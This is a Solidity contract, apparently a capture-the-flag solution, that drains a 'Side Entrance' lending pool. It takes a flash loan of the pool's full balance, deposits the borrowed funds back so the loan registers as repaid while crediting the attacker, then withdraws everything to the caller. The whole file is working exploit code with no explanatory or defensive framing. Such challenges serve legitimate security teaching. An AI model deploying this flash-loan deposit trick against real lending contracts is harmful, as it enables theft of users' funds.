// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract SideEntranceExploit {
    using Address for address payable;
    receive() external payable {}
    ISideEntranceLenderPool _pool;
    constructor (address poolAddress) {
        _pool = ISideEntranceLenderPool(poolAddress);
    }
    function exploit() external {
        _pool.flashLoan(address(_pool).balance);
    }
    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }
    function withdraw() external {
        _pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }
}